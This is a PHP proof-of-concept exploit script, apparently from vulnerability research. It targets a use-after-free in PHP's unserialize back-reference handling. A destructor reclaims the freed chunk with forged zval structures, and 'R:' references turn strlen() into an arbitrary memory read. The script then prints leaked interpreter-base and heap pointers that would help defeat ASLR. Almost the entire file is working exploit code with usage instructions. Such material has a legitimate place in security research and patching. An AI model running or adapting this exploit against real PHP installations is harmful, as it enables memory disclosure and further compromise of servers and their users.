<?php
// vdR1: IN-BAND ADDRESS LEAK from the vd3 var_destroy re-entry UAF (zero4).
//
// Mechanism: destructor reclaims the freed 8160B var_entries chunk with a
// period-80 controlled string (single str_repeat alloc = the reclaim), then
// re-entrant R:1020/1021/1022 make var_access return data[1..3] = val[0..24]
// = FORGED P pointers -> R-rule ZVAL_NEW_REF copies the 16 bytes at *P into
// a zend_reference handed to userland. Each *P is a fake zval
// {value=Q, type_info=IS_STRING} living in the same payload, so strlen($r)
// returns *(Q+16): a QWORD ORACLE at any address.
//
// usage: php vdR1_leak.php <chunk> <base> <d>   (decimal; discovery run: zeros)
$CHUNK = (int)($argv[1] ?? 0);
$BASE  = (int)($argv[2] ?? 0);
$D     = (int)($argv[3] ?? 0);

class D {
    public function __destruct() {
        global $CHUNK, $BASE, $D;
        // oracle targets:
        $T1 = $BASE + 0x10dc8c0; // &EG(symbol_table).pDestructor (holds zval_ptr_dtor, binary-relative)
        $T2 = $D + 8;            // &d->first_dtor (ZendMM heap ptr)
        $T3 = $D + 0;            // &d->last      (ZendMM heap ptr)
        // fake zvals at payload offsets 24/40/56 (period 80):
        $P1 = $CHUNK + 24 + 24;
        $P2 = $CHUNK + 24 + 40;
        $P3 = $CHUNK + 24 + 56;
        $pat  = pack('PPP', $P1, $P2, $P3);
        $pat .= pack('PVV', $T1 - 16, 6, 0);
        $pat .= pack('PVV', $T2 - 16, 6, 0);
        $pat .= pack('PVV', $T3 - 16, 6, 0);
        $pat .= str_repeat("\x00", 8);          // 72..80
        // THE reclaim: first >4072-byte alloc in this frame takes the freed 2-page run
        $s = str_repeat($pat, 102);             // 8160 bytes, single alloc
        $r1 = @unserialize('R:1020;');          // data[1] = val[0..8] = P1
        $r2 = @unserialize('R:1021;');          // data[2] = val[8..16] = P2
        $r3 = @unserialize('R:1022;');          // data[3] = val[16..24] = P3
        $l1 = strlen($r1); $l2 = strlen($r2); $l3 = strlen($r3);
        echo "LEAK1 EG(symbol_table).pDestructor = 0x", dechex($l1),
             "  (= zval_ptr_dtor, base+0x", dechex($l1 - $BASE), ")\n";
        echo "LEAK2 d->first_dtor = 0x", dechex($l2), "\n";
        echo "LEAK3 d->last       = 0x", dechex($l3), "\n";
    }
}
$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SURVIVED\n";
